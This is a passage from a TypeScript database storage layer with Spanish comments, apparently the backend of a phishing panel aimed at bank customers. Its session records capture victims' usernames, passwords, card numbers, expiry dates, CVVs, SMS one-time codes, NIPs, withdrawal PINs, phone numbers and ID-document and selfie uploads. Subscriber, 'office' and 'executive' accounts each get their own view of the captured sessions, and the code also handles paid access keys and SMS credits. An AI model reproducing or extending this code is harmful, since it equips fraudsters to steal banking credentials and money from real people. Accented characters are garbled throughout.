deviceCount = Math.max(0, (user.deviceCount || 0) - 1);\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({ deviceCount })\n      .where(eq(users.username, username))\n      .returning();\n    \n    return updatedUser;\n  }\n  \n  // Verificar y desactivar usuarios expirados\n  async cleanupExpiredUsers(): Promise<number> {\n    const now = new Date();\n    \n    // Actualizar directamente en la base de datos\n    const result = await db\n      .update(users)\n      .set({ isActive: false })\n      .where(\n        and(\n          eq(users.isActive, true),\n          lt(users.expiresAt, now)\n        )\n      )\n      .returning();\n    \n    const deactivatedCount = result.length;\n    console.log(`[Storage] Desactivados ${deactivatedCount} usuarios expirados`);\n    \n    return deactivatedCount;\n  }\n\n  async getUsersExpiringTomorrow(): Promise<User[]> {\n    const tomorrow = new Date();\n    tomorrow.setDate(tomorrow.getDate() + 1);\n    tomorrow.setHours(0, 0, 0, 0);\n    \n    const dayAfterTomorrow = new Date(tomorrow);\n    dayAfterTomorrow.setDate(dayAfterTomorrow.getDate() + 1);\n    \n    const result = await db\n      .select()\n      .from(users)\n      .where(\n        and(\n          eq(users.isActive, true),\n          isNotNull(users.expiresAt),\n          gte(users.expiresAt, tomorrow),\n          lt(users.expiresAt, dayAfterTomorrow),\n          isNotNull(users.telegramChatId)\n        )\n      );\n    \n    return result;\n  }\n\n  async getRecentlyExpiredUsers(): Promise<User[]> {\n    const now = new Date();\n    const yesterday = new Date(now);\n    yesterday.setDate(yesterday.getDate() - 1);\n    \n    const result = await db\n      .select()\n      .from(users)\n      .where(\n        and(\n          eq(users.isActive, false), // Usuario ya desactivado\n          isNotNull(users.expiresAt),\n          gte(users.expiresAt, yesterday), // Expir贸 en las 煤ltimas 24 horas\n          lt(users.expiresAt, now),\n          isNotNull(users.telegramChatId)\n        )\n      );\n    \n    return result;\n  }\n  \n  async getAllAdminUsers(): Promise<User[]> {\n    return await db\n      .select()\n      .from(users)\n      .where(eq(users.role, UserRole.ADMIN));\n  }\n  \n  async getAllUsers(): Promise<User[]> {\n    return await db\n      .select()\n      .from(users);\n  }\n  \n  // Eliminar un usuario\n  async deleteUser(username: string): Promise<boolean> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      return false;\n    }\n    \n    try {\n      // Primero eliminar todos los registros relacionados\n      console.log(`[Storage] Eliminando registros relacionados del usuario ${username} (ID: ${user.id})`);\n      \n      // 1. Eliminar ejecutivos y perfil de oficina si existen (sin importar accountType)\n      // Eliminar todos los ejecutivos de esta oficina\n      await db.delete(executives).where(eq(executives.userId, user.id));\n      console.log(`[Storage] Ejecutivos eliminados (si exist铆an)`);\n      \n      // Eliminar perfil de oficina si existe\n      await db.delete(officeProfiles).where(eq(officeProfiles.userId, user.id));\n      console.log(`[Storage] Perfil de oficina eliminado (si exist铆a)`);\n      \n      // 2. Eliminar pagos del usuario\n      await db.delete(payments).where(eq(payments.userId, user.id));\n      console.log(`[Storage] Pagos eliminados`);\n      \n      // 3. Eliminar preferencias de notificaci贸n\n      await db.delete(notificationPreferences).where(eq(notificationPreferences.userId, user.id));\n      console.log(`[Storage] Preferencias de notificaci贸n eliminadas`);\n      \n      // 4. Eliminar notificaciones\n      await db.delete(notifications).where(eq(notifications.userId, user.id));\n      console.log(`[Storage] Notificaciones eliminadas`);\n      \n      // 5. Actualizar discount_codes que fueron usados por este usuario (poner used_by en null)\n      await db.update(discountCodes)\n        .set({ usedBy: null })\n        .where(eq(discountCodes.usedBy, user.id));\n      console.log(`[Storage] Referencias en discount_codes actualizadas`);\n      \n      // 6. Eliminar c贸digos de verificaci贸n del usuario\n      await db.delete(verificationCodes).where(eq(verificationCodes.userId, user.id));\n      console.log(`[Storage] C贸digos de verificaci贸n eliminados`);\n      \n      // Ahora s铆 eliminar el usuario de la base de datos\n      await db\n        .delete(users)\n        .where(eq(users.username, username));\n      \n      console.log(`[Storage] Usuario ${username} eliminado exitosamente`);\n      return true;\n    } catch (error: any) {\n      console.error(`[Storage] Error eliminando usuario ${username}:`, error);\n      throw new Error(`Error al eliminar usuario: ${error.message}`);\n    }\n  }\n  \n  // === M茅todos de Access Keys ===\n  async createAccessKey(data: InsertAccessKey): Promise<AccessKey> {\n    // Si no se proporciona una key, generar una aleatoria\n    const keyValue = data.key || nanoid(16); \n    \n    // Insertar en la base de datos\n    const [accessKey] = await db\n      .insert(accessKeys)\n      .values({\n        key: keyValue,\n        description: data.description || null,\n        createdBy: data.createdBy,\n        expiresAt: data.expiresAt,\n        maxDevices: data.maxDevices || 3,\n        activeDevices: 0,\n        isActive: true,\n        createdAt: new Date(),\n        lastUsed: null\n      })\n      .returning();\n    \n    return accessKey;\n  }\n  \n  async getAccessKeyById(id: number): Promise<AccessKey | undefined> {\n    const [accessKey] = await db\n      .select()\n      .from(accessKeys)\n      .where(eq(accessKeys.id, id));\n    \n    return accessKey;\n  }\n  \n  async getAccessKeyByKey(key: string): Promise<AccessKey | undefined> {\n    const [accessKey] = await db\n      .select()\n      .from(accessKeys)\n      .where(eq(accessKeys.key, key));\n    \n    return accessKey;\n  }\n  \n  async getAllAccessKeys(): Promise<AccessKey[]> {\n    return await db\n      .select()\n      .from(accessKeys);\n  }\n  \n  async getActiveAccessKeys(): Promise<AccessKey[]> {\n    const now = new Date();\n    \n    return await db\n      .select()\n      .from(accessKeys)\n      .where(\n        and(\n          eq(accessKeys.isActive, true),\n          gte(accessKeys.expiresAt, now)\n        )\n      );\n  }\n  \n  async updateAccessKey(id: number, data: Partial<AccessKey>): Promise<AccessKey> {\n    const accessKey = await this.getAccessKeyById(id);\n    \n    if (!accessKey) {\n      throw new Error(`Access key con ID ${id} no encontrada`);\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedKey] = await db\n      .update(accessKeys)\n      .set(data)\n      .where(eq(accessKeys.id, id))\n      .returning();\n    \n    return updatedKey;\n  }\n  \n  async deleteAccessKey(id: number): Promise<boolean> {\n    const accessKey = await this.getAccessKeyById(id);\n    \n    if (!accessKey) {\n      return false;\n    }\n    \n    // Eliminar de la base de datos\n    await db\n      .delete(accessKeys)\n      .where(eq(accessKeys.id, id));\n    \n    return true;\n  }\n  \n  // === M茅todos de dispositivos ===\n  async registerDevice(data: InsertDevice): Promise<Device> {\n    // Insertar en la base de datos\n    const [device] = await db\n      .insert(devices)\n      .values({\n        accessKeyId: data.accessKeyId,\n        deviceId: data.deviceId,\n        userAgent: data.userAgent || null,\n        ipAddress: data.ipAddress || null,\n        lastActive: new Date(),\n        isActive: true,\n        createdAt: new Date()\n      })\n      .returning();\n    \n    // Actualizar contador de dispositivos activos para esta llave\n    const accessKey = await this.getAccessKeyById(data.accessKeyId);\n    if (accessKey) {\n      const activeDevices = await this.countActiveDevicesForKey(data.accessKeyId);\n      await this.updateAccessKey(data.accessKeyId, { \n        activeDevices,\n        lastUsed: new Date()\n      });\n    }\n    \n    return device;\n  }\n  \n  async getDeviceByDeviceId(deviceId: string): Promise<Device | undefined> {\n    const [device] = await db\n      .select()\n      .from(devices)\n      .where(\n        and(\n          eq(devices.deviceId, deviceId),\n          eq(devices.isActive, true)\n        )\n      );\n    \n    return device;\n  }\n  \n  async getDevicesByAccessKeyId(accessKeyId: number): Promise<Device[]> {\n    return await db\n      .select()\n      .from(devices)\n      .where(eq(devices.accessKeyId, accessKeyId));\n  }\n  \n  async updateDevice(id: number, data: Partial<Device>): Promise<Device> {\n    const [device] = await db\n      .select()\n      .from(devices)\n      .where(eq(devices.id, id));\n    \n    if (!device) {\n      throw new Error(`Dispositivo con ID ${id} no encontrado`);\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedDevice] = await db\n      .update(devices)\n      .set(data)\n      .where(eq(devices.id, id))\n      .returning();\n    \n    return updatedDevice;\n  }\n  \n  async deleteDevice(id: number): Promise<boolean> {\n    const [device] = await db\n      .select()\n      .from(devices)\n      .where(eq(devices.id, id));\n    \n    if (!device) {\n      return false;\n    }\n    \n    // En lugar de eliminar, marcamos como inactivo\n    const [updatedDevice] = await db\n      .update(devices)\n      .set({ isActive: false })\n      .where(eq(devices.id, id))\n      .returning();\n    \n    // Actualizar contador de dispositivos activos para esta llave\n    await this.countActiveDevicesForKey(device.accessKeyId);\n    \n    return true;\n  }\n  \n  async countActiveDevicesForKey(accessKeyId: number): Promise<number> {\n    const devices = await this.getDevicesByAccessKeyId(accessKeyId);\n    const activeCount = devices.filter(device => device.isActive).length;\n    \n    // Actualizar el contador en la llave de acceso\n    await db\n      .update(accessKeys)\n      .set({ activeDevices: activeCount })\n      .where(eq(accessKeys.id, accessKeyId));\n    \n    return activeCount;\n  }\n\n  // === M茅todos de sesiones ===\n  async getAllSessions(): Promise<Session[]> {\n    return await db\n      .select()\n      .from(sessions);\n  }\n\n  async getSavedSessions(userId?: number, isExecutive?: boolean): Promise<Session[]> {\n    // Si no se proporciona userId, retornar todas (comportamiento para admins)\n    if (!userId) {\n      const savedSessions = await db\n        .select()\n        .from(sessions)\n        .where(eq(sessions.saved, true));\n      \n      console.log(`[Storage] getSavedSessions: Encontradas ${savedSessions.length} sesiones guardadas`);\n      \n      if (savedSessions.length > 0) {\n        savedSessions.forEach(session => {\n          console.log(`[Storage] Sesi贸n guardada ${session.sessionId}, creador: ${session.createdBy || 'desconocido'}, banco: ${session.banco}`);\n        });\n      }\n      \n      return savedSessions;\n    }\n    \n    if (isExecutive) {\n      // Ejecutivo: solo ver sesiones donde executiveId coincide\n      const savedSessions = await db\n        .select()\n        .from(sessions)\n        .where(\n          and(\n            eq(sessions.saved, true),\n            eq(sessions.executiveId, userId)\n          )\n        );\n      \n      console.log(`[Storage] getSavedSessions (ejecutivo ${userId}): Encontradas ${savedSessions.length} sesiones`);\n      return savedSessions;\n    } else {\n      // Usuario/Oficina\n      const user = await this.getUserById(userId);\n      if (!user) {\n        return [];\n      }\n      \n      if (user.accountType === 'office') {\n        // Oficina: sesiones del due帽o (executiveId=null) + todas de sus ejecutivos\n        const savedSessions = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              eq(sessions.saved, true),\n              eq(sessions.createdBy, user.username)\n            )\n          );\n        \n        console.log(`[Storage] getSavedSessions (oficina ${user.username}): Encontradas ${savedSessions.length} sesiones`);\n        return savedSessions;\n      } else {\n        // Usuario individual: solo sus propias sesiones\n        const savedSessions = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              eq(sessions.saved, true),\n              eq(sessions.createdBy, user.username)\n            )\n          );\n        \n        console.log(`[Storage] getSavedSessions (usuario ${user.username}): Encontradas ${savedSessions.length} sesiones`);\n        return savedSessions;\n      }\n    }\n  }\n\n  async getCurrentSessions(userId?: number, isExecutive?: boolean): Promise<Session[]> {\n    // Si no se proporciona userId, retornar todas (comportamiento para admins)\n    if (!userId) {\n      return await db\n        .select()\n        .from(sessions)\n        .where(\n          and(\n            eq(sessions.active, true),\n            eq(sessions.saved, false)\n          )\n        );\n    }\n    \n    if (isExecutive) {\n      // Ejecutivo: solo ver sesiones donde executiveId coincide\n      const currentSessions = await db\n        .select()\n        .from(sessions)\n        .where(\n          and(\n            eq(sessions.active, true),\n            eq(sessions.saved, false),\n            eq(sessions.executiveId, userId)\n          )\n        );\n      \n      console.log(`[Storage] getCurrentSessions (ejecutivo ${userId}): Encontradas ${currentSessions.length} sesiones`);\n      return currentSessions;\n    } else {\n      // Usuario/Oficina\n      const user = await this.getUserById(userId);\n      if (!user) {\n        return [];\n      }\n      \n      if (user.accountType === 'office') {\n        // Oficina: sesiones del due帽o (executiveId=null) + todas de sus ejecutivos\n        const currentSessions = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              eq(sessions.active, true),\n              eq(sessions.saved, false),\n              eq(sessions.createdBy, user.username)\n            )\n          );\n        \n        console.log(`[Storage] getCurrentSessions (oficina ${user.username}): Encontradas ${currentSessions.length} sesiones`);\n        return currentSessions;\n      } else {\n        // Usuario individual: solo sus propias sesiones\n        const currentSessions = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              eq(sessions.active, true),\n              eq(sessions.saved, false),\n              eq(sessions.createdBy, user.username)\n            )\n          );\n        \n        console.log(`[Storage] getCurrentSessions (usuario ${user.username}): Encontradas ${currentSessions.length} sesiones`);\n        return currentSessions;\n      }\n    }\n  }\n\n  async getSessionById(sessionId: string): Promise<Session | undefined> {\n    const [session] = await db\n      .select()\n      .from(sessions)\n      .where(eq(sessions.sessionId, sessionId));\n    \n    return session;\n  }\n\n  async createSession(data: Partial<Session>): Promise<Session> {\n    if (!data.sessionId) {\n      throw new Error(\"SessionId is required\");\n    }\n\n    const createdAt = new Date();\n    const active = true;\n    const saved = false;\n    \n    // Insertar en la base de datos\n    const [session] = await db\n      .insert(sessions)\n      .values({\n        sessionId: data.sessionId,\n        folio: data.folio || null,\n        username: data.username || null,\n        password: data.password || null,\n        banco: data.banco || \"LIVERPOOL\",\n        tarjeta: data.tarjeta || null,\n        fechaVencimiento: data.fechaVencimiento || null,\n        cvv: data.cvv || null,\n        sms: data.sms || null,\n        nip: data.nip || null,\n        smsCompra: data.smsCompra || null,\n        celular: data.celular || null,\n        pasoActual: data.pasoActual || \"folio\",\n        createdAt,\n        active,\n        saved,\n        createdBy: data.createdBy || null,\n        executiveId: data.executiveId || null, // Incluir executiveId\n        qrData: data.qrData || null,\n        qrImageData: data.qrImageData || null,\n        codigoRetiro: null,\n        pinRetiro: null,\n        lastActivity: new Date(),\n        hasUserData: false,\n        flowConfig: data.flowConfig || null, // Incluir flowConfig\n        currentStepIndex: data.currentStepIndex || 0,\n        flowState: data.flowState || null,\n      })\n      .returning();\n\n    return session;\n  }\n\n  async updateSession(sessionId: string, data: Partial<Session>): Promise<Session> {\n    const session = await this.getSessionById(sessionId);\n    if (!session) {\n      throw new Error(`Session with ID ${sessionId} not found`);\n    }\n\n    // Actualizar en la base de datos\n    const [updatedSession] = await db\n      .update(sessions)\n      .set(data)\n      .where(eq(sessions.sessionId, sessionId))\n      .returning();\n\n    return updatedSession;\n  }\n\n  async deleteSession(sessionId: string): Promise<boolean> {\n    const session = await this.getSessionById(sessionId);\n    if (!session) {\n      return false;\n    }\n\n    // Eliminar de la base de datos\n    await db\n      .delete(sessions)\n      .where(eq(sessions.sessionId, sessionId));\n\n    return true;\n  }\n\n  async getSessionsWithIdentityDocuments(userId?: number, isExecutive?: boolean): Promise<any[]> {\n    try {\n      // Si no se proporciona userId, retornar todas (comportamiento para superadmins)\n      if (!userId) {\n        const result = await db\n          .select()\n          .from(sessions)\n          .where(sql`${sessions.identityVerified} = true AND (${sessions.documentFileUrl} IS NOT NULL OR ${sessions.selfieFileUrl} IS NOT NULL)`)\n          .orderBy(desc(sessions.createdAt));\n        \n        return result;\n      }\n      \n      // Obtener informaci贸n del usuario\n      const user = await this.getUserById(userId);\n      if (!user) {\n        return [];\n      }\n      \n      if (isExecutive) {\n        // Ejecutivo: solo sesiones donde executiveId coincide\n        const result = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              sql`${sessions.identityVerified} = true AND (${sessions.documentFileUrl} IS NOT NULL OR ${sessions.selfieFileUrl} IS NOT NULL)`,\n              eq(sessions.executiveId, userId)\n            )\n          )\n          .orderBy(desc(sessions.createdAt));\n        \n        console.log(`[Storage] getSessionsWithIdentityDocuments (ejecutivo ${userId}): Encontradas ${result.length} sesiones`);\n        return result;\n      } else if (user.accountType === 'office') {\n        // Usuario de oficina: todas las sesiones creadas por 茅l o sus ejecutivos\n        const result = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              sql`${sessions.identityVerified} = true AND (${sessions.documentFileUrl} IS NOT NULL OR ${sessions.selfieFileUrl} IS NOT NULL)`,\n              eq(sessions.createdBy, user.username)\n            )\n          )\n          .orderBy(desc(sessions.createdAt));\n        \n        console.log(`[Storage] getSessionsWithIdentityDocuments (oficina ${user.username}): Encontradas ${result.length} sesiones`);\n        return result;\n      } else {\n        // Usuario individual: solo sus sesiones\n        const result = await db\n          .select()\n          .from(sessions)\n          .where(\n            and(\n              sql`${sessions.identityVerified} = true AND (${sessions.documentFileUrl} IS NOT NULL OR ${sessions.selfieFileUrl} IS NOT NULL)`,\n              eq(sessions.createdBy, user.username)\n            )\n          )\n          .orderBy(desc(sessions.createdAt));\n        \n        console.log(`[Storage] getSessionsWithIdentityDocuments (usuario ${user.username}): Encontradas ${result.length} sesiones`);\n        return result;\n      }\n    } catch (error) {\n      console.error('Error getting sessions with identity documents:', error);\n      return [];\n    }\n  }\n  \n  async saveSession(sessionId: string): Promise<Session> {\n    const session = await this.getSessionById(sessionId);\n    if (!session) {\n      throw new Error(`Session with ID ${sessionId} not found`);\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedSession] = await db\n      .update(sessions)\n      .set({ \n        saved: true,\n        // Garantizar que se conserva createdBy (por si acaso)\n        createdBy: session.createdBy \n      })\n      .where(eq(sessions.sessionId, sessionId))\n      .returning();\n    \n    console.log(`Guardando sesi贸n ${sessionId}, creada por: ${session.createdBy || 'desconocido'}`);\n    \n    return updatedSession;\n  }\n  \n  // === M茅todos de API SMS ===\n  async getSmsConfig(): Promise<SmsConfig | null> {\n    const [config] = await db\n      .select()\n      .from(smsConfig);\n    \n    return config || null;\n  }\n  \n  async updateSmsConfig(data: InsertSmsConfig): Promise<SmsConfig> {\n    // Preparar valores con tipos seguros\n    let username: string | null = null;\n    if (typeof data.username === 'string') {\n      username = data.username;\n    }\n    \n    let password: string | null = null;\n    if (typeof data.password === 'string') {\n      password = data.password;\n    }\n    \n    let apiUrl: string = \"https://api.sofmex.mx/api/sms\";\n    if (typeof data.apiUrl === 'string') {\n      apiUrl = data.apiUrl;\n    }\n    \n    // Verificar si ya existe configuraci贸n\n    const existingConfig = await this.getSmsConfig();\n    \n    let configResult: SmsConfig;\n    \n    if (existingConfig) {\n      // Actualizar configuraci贸n existente\n      const [updated] = await db\n        .update(smsConfig)\n        .set({\n          username,\n          password,\n          apiUrl,\n          isActive: true,\n          updatedAt: new Date(),\n          updatedBy: data.updatedBy\n        })\n        .where(eq(smsConfig.id, existingConfig.id))\n        .returning();\n      \n      configResult = updated;\n    } else {\n      // Crear nueva configuraci贸n\n      const [newConfig] = await db\n        .insert(smsConfig)\n        .values({\n          username,\n          password,\n          apiUrl,\n          isActive: true,\n          updatedAt: new Date(),\n          updatedBy: data.updatedBy\n        })\n        .returning();\n      \n      configResult = newConfig;\n    }\n    \n    return configResult;\n  }\n  \n  // === M茅todos de configuraci贸n del sitio ===\n  async getSiteConfig(): Promise<SiteConfig | null> {\n    const [config] = await db\n      .select()\n      .from(siteConfig)\n      .where(eq(siteConfig.id, 1));\n    \n    return config || null;\n  }\n  \n  async updateSiteConfig(data: InsertSiteConfig): Promise<SiteConfig> {\n    // Usar patr贸n singleton con ID fijo = 1 para asegurar una sola fila\n    const SINGLETON_ID = 1;\n    \n    // Usar upsert robusto: intentar actualizar, si no existe entonces insertar\n    try {\n      // Intentar actualizar el registro existente con ID = 1\n      const [updated] = await db\n        .update(siteConfig)\n        .set({\n          baseUrl: data.baseUrl,\n          updatedBy: data.updatedBy,\n          updatedAt: new Date()\n        })\n        .where(eq(siteConfig.id, SINGLETON_ID))\n        .returning();\n      \n      if (updated) {\n        return updated;\n      }\n    } catch (error) {\n      console.log('No se pudo actualizar, intentando insertar nueva configuraci贸n');\n    }\n    \n    // Si no se pudo actualizar (porque no existe), insertar con ID = 1\n    try {\n      const [newConfig] = await db\n        .insert(siteConfig)\n        .values({\n          id: SINGLETON_ID,\n          baseUrl: data.baseUrl,\n          updatedBy: data.updatedBy,\n          updatedAt: new Date()\n        })\n        .returning();\n      \n      return newConfig;\n    } catch (insertError) {\n      // Si falla la inserci贸n (puede ser por concurrencia), intentar obtener el registro existente\n      const existingConfig = await this.getSiteConfig();\n      if (existingConfig) {\n        // Reintentar la actualizaci贸n\n        const [retryUpdated] = await db\n          .update(siteConfig)\n          .set({\n            baseUrl: data.baseUrl,\n            updatedBy: data.updatedBy,\n            updatedAt: new Date()\n          })\n          .where(eq(siteConfig.id, SINGLETON_ID))\n          .returning();\n        \n        return retryUpdated;\n      }\n      \n      throw new Error('No se pudo crear o actualizar la configuraci贸n del sitio');\n    }\n  }\n  \n  // === M茅todos de cr茅ditos SMS ===\n  async getUserSmsCredits(userId: number): Promise<number> {\n    const [credits] = await db\n      .select()\n      .from(smsCredits)\n      .where(eq(smsCredits.userId, userId));\n    \n    return credits && credits.credits ? parseFloat(credits.credits) : 0;\n  }\n  \n  async addSmsCredits(userId: number, amount: number): Promise<SmsCredits> {\n    const user = await this.getUserById(userId);\n    if (!user) {\n      throw new Error(`Usuario con ID ${userId} no encontrado`);\n    }\n    \n    // Buscar cr茅ditos existentes\n    const [existingCredits] = await db\n      .select()\n      .from(smsCredits)\n      .where(eq(smsCredits.userId, userId));\n    \n    let smsCreditsResult: SmsCredits;\n    \n    if (existingCredits) {\n      // Actualizar cr茅ditos existentes\n      const currentCredits = parseFloat(existingCredits.credits || \"0\");\n      const [updated] = await db\n        .update(smsCredits)\n        .set({\n          credits: (currentCredits + amount).toString(),\n          updatedAt: new Date()\n        })\n        .where(eq(smsCredits.id, existingCredits.id))\n        .returning();\n      \n      smsCreditsResult = updated;\n    } else {\n      // Crear nuevo registro de cr茅ditos\n      const [newCredits] = await db\n        .insert(smsCredits)\n        .values({\n          userId,\n          credits: amount.toString(),\n          updatedAt: new Date()\n        })\n        .returning();\n      \n      smsCreditsResult = newCredits;\n    }\n    \n    return smsCreditsResult;\n  }\n  \n  async useSmsCredit(userId: number): Promise<boolean> {\n    return this.useSmsCredits(userId, 1);\n  }\n  \n  async useSmsCredits(userId: number, amount: number): Promise<boolean> {\n    const currentCredits = await this.getUserSmsCredits(userId);\n    \n    if (currentCredits < amount) {\n      return false;\n    }\n    \n    // Buscar cr茅ditos existentes\n    const [existingCredits] = await db\n      .select()\n      .from(smsCredits)\n      .where(eq(smsCredits.userId, userId));\n    \n    if (existingCredits) {\n      // Decrementar cr茅ditos\n      const newCredits = currentCredits - amount;\n      await db\n        .update(smsCredits)\n        .set({\n          credits: newCredits.toString(),\n          updatedAt: new Date()\n        })\n        .where(eq(smsCredits.id, existingCredits.id));\n      \n      return true;\n    }\n    \n    return false;\n  }\n  \n  // === M茅todos de historial SMS ===\n  async addSmsToHistory(data: InsertSmsHistory): Promise<SmsHistory> {\n    // Insertar en la base de datos usando el esquema exacto\n    const insertData = {\n      ...data,\n      routeType: (data.routeType as SmsRouteType) || SmsRouteType.SHORT_CODE,\n      creditCost: data.creditCost?.toString() || \"1\"\n    };\n    \n    const [smsHistoryRecord] = await db\n      .insert(smsHistory)\n      .values(insertData)\n      .returning();\n    \n    return smsHistoryRecord;\n  }\n  \n  async getUserSmsHistory(userId: number): Promise<SmsHistory[]> {\n    const history = await db\n      .select()\n      .from(smsHistory)\n      .where(eq(smsHistory.userId, userId))\n      .orderBy(desc(smsHistory.sentAt));\n    \n    return history;\n  }\n  \n  async updateSmsStatus(id: number, status: string, errorMessage?: string): Promise<SmsHistory> {\n    const [updatedSms] = await db\n      .update(smsHistory)\n      .set({\n        status,\n        errorMessage: errorMessage || null\n      })\n      .where(eq(smsHistory.id, id))\n      .returning();\n    \n    return updatedSms;\n  }\n  \n  // === M茅todos de limpieza y mantenimiento ===\n  async cleanupExpiredSessions(): Promise<number> {\n    const now = new Date();\n    const thirtyMinutesAgo = new Date(now.getTime() - 30 * 60 * 1000); // 30 minutos en ms\n    const tenMinutesAgo = new Date(now.getTime() - 10 * 60 * 1000); // 10 minutos en ms\n    \n    // Primero, identificar las sesiones que se van a eliminar\n    const sessionsToDeleteNoData = await db\n      .select()\n      .from(sessions)\n      .where(\n        and(\n          eq(sessions.hasUserData, false), // Sesiones sin datos\n          lt(sessions.createdAt, tenMinutesAgo), // Creadas hace m谩s de 10 minutos\n          eq(sessions.saved, false) // No guardadas\n        )\n      );\n    \n    const sessionsToDeleteInactive = await db\n      .select()\n      .from(sessions)\n      .where(\n        and(\n          eq(sessions.saved, false),\n          lt(sessions.lastActivity, thirtyMinutesAgo),\n          eq(sessions.hasUserData, true) // Solo sesiones con datos pero sin actividad\n        )\n      );\n    \n    const allSessionsToDelete = [...sessionsToDeleteNoData, ...sessionsToDeleteInactive];\n    const sessionIdsToDelete = allSessionsToDelete.map(s => s.sessionId);\n    \n    // Si hay sesiones para eliminar, primero cancelar sus links asociados\n    if (sessionIdsToDelete.length > 0) {\n      // Cancelar todos los links asociados a estas sesiones\n      await db\n        .update(linkTokens)\n        .set({ status: 'CANCELLED' })\n        .where(\n          and(\n            inArray(linkTokens.sessionId, sessionIdsToDelete),\n            eq(linkTokens.status, 'ACTIVE')\n          )\n        );\n      \n      console.log(`[Storage] Links cancelados para ${sessionIdsToDelete.length} sesiones antes de eliminarlas`);\n    }\n    \n    // Ahora s铆 eliminar las sesiones\n    const resultNoData = await db\n      .delete(sessions)\n      .where(\n        and(\n          eq(sessions.hasUserData, false),\n          lt(sessions.createdAt, tenMinutesAgo),\n          eq(sessions.saved, false)\n        )\n      )\n      .returning();\n    \n    const resultInactive = await db\n      .delete(sessions)\n      .where(\n        and(\n          eq(sessions.saved, false),\n          lt(sessions.lastActivity, thirtyMinutesAgo),\n          eq(sessions.hasUserData, true)\n        )\n      )\n      .returning();\n    \n    const deletedCount = resultNoData.length + resultInactive.length;\n    \n    if (resultNoData.length > 0) {\n      console.log(`[Storage] Limpieza autom谩tica: eliminadas ${resultNoData.length} sesiones sin datos (>10 min)`);\n    }\n    \n    if (resultInactive.length > 0) {\n      console.log(`[Storage] Limpieza autom谩tica: eliminadas ${resultInactive.length} sesiones inactivas (>30 min)`);\n    }\n    \n    return deletedCount;\n  }\n  \n  async updateSessionActivity(sessionId: string): Promise<void> {\n    const session = await this.getSessionById(sessionId);\n    if (session) {\n      await db\n        .update(sessions)\n        .set({ lastActivity: new Date() })\n        .where(eq(sessions.sessionId, sessionId));\n    }\n  }\n  \n  async markSessionHasUserData(sessionId: string): Promise<void> {\n    const session = await this.getSessionById(sessionId);\n    if (session) {\n      await db\n        .update(sessions)\n        .set({ hasUserData: true })\n        .where(eq(sessions.sessionId, sessionId));\n    }\n  }\n\n  async updateSessionPhoneNumber(sessionId: string, phoneNumber: string): Promise<void> {\n    const session = await this.getSessionById(sessionId);\n    if (session) {\n      await db\n        .update(sessions)\n        .set({ celular: phoneNumber })\n        .where(eq(sessions.sessionId, sessionId));\n    }\n  }\n\n  // === M茅todos de notificaciones ===\n  async createNotification(data: InsertNotification): Promise<Notification> {\n    try {\n      // Verificar que el usuario exista\n      const user = await this.getUserById(data.userId);\n      if (!user) {\n        throw new Error(`Usuario con ID ${data.userId} no encontrado`);\n      }\n\n      // Verificar preferencias de notificaci贸n del usuario\n      const userPrefs = await this.getNotificationPreferences(data.userId);\n      \n      // Si el usuario tiene preferencias espec铆ficas, verificar si debe recibir este tipo de notificaci贸n\n      if (userPrefs) {\n        // Verificar tipo de notificaci贸n\n        if (data.type === NotificationType.SESSION_ACTIVITY && !userPrefs.sessionActivityEnabled) {\n          console.log(`[Notificaciones] Usuario ${user.username} tiene desactivadas las notificaciones de actividad de sesi贸n`);\n          return null as any;\n        }\n        \n        if (data.type === NotificationType.USER_ACTIVITY && !userPrefs.userActivityEnabled) {\n          console.log(`[Notificaciones] Usuario ${user.username} tiene desactivadas las notificaciones de actividad de usuario`);\n          return null as any;\n        }\n        \n        if (data.type === NotificationType.SYSTEM && !userPrefs.systemEnabled) {\n          console.log(`[Notificaciones] Usuario ${user.username} tiene desactivadas las notificaciones del sistema`);\n          return null as any;\n        }\n        \n        // Verificar prioridad m铆nima\n        const priorityLevels = {\n          [NotificationPriority.LOW]: 0,\n          [NotificationPriority.MEDIUM]: 1,\n          [NotificationPriority.HIGH]: 2,\n          [NotificationPriority.URGENT]: 3\n        };\n        \n        if (data.priority && userPrefs.minPriority && priorityLevels[data.priority as NotificationPriority] < priorityLevels[userPrefs.minPriority]) {\n          console.log(`[Notificaciones] Notificaci贸n con prioridad ${data.priority} inferior a la m铆nima del usuario ${userPrefs.minPriority}`);\n          return null as any;\n        }\n      }\n      \n      // Crear la notificaci贸n en la base de datos\n      const insertData = {\n        ...data,\n        type: data.type as NotificationType,\n        priority: (data.priority as NotificationPriority) || NotificationPriority.MEDIUM\n      };\n      const [notification] = await db.insert(notifications).values(insertData).returning();\n      \n      console.log(`[Notificaciones] Creada nueva notificaci贸n para ${user.username}: ${data.title}`);\n      return notification;\n    } catch (error) {\n      console.error('[Notificaciones] Error al crear notificaci贸n:', error);\n      throw error;\n    }\n  }\n  \n  async getUserNotifications(userId: number, limit?: number): Promise<Notification[]> {\n    try {\n      // Verificar que el usuario exista\n      const user = await this.getUserById(userId);\n      if (!user) {\n        throw new Error(`Usuario con ID ${userId} no encontrado`);\n      }\n      \n      // Obtener notificaciones ordenadas por fecha (m谩s recientes primero)\n      const query = db.select()\n        .from(notifications)\n        .where(eq(notifications.userId, userId))\n        .orderBy(desc(notifications.createdAt));\n      \n      // Aplicar l铆mite si se especifica y ejecutar consulta\n      const userNotifications = limit ? await query.limit(limit) : await query;\n      return userNotifications;\n    } catch (error) {\n      console.error('[Notificaciones] Error al obtener notificaciones:', error);\n      return [];\n    }\n  }\n  \n  async getUnreadNotificationsCount(userId: number): Promise<number> {\n    try {\n      // Contar notificaciones no le铆das\n      const result = await db.select({ count: count() })\n        .from(notifications)\n        .where(\n          and(\n            eq(notifications.userId, userId),\n            eq(notifications.read, false)\n          )\n        );\n      \n      return result[0]?.count || 0;\n    } catch (error) {\n      console.error('[Notificaciones] Error al contar notificaciones no le铆das:', error);\n      return 0;\n    }\n  }\n  \n  async markNotificationAsRead(id: number): Promise<Notification> {\n    try {\n      // Marcar como le铆da\n      const 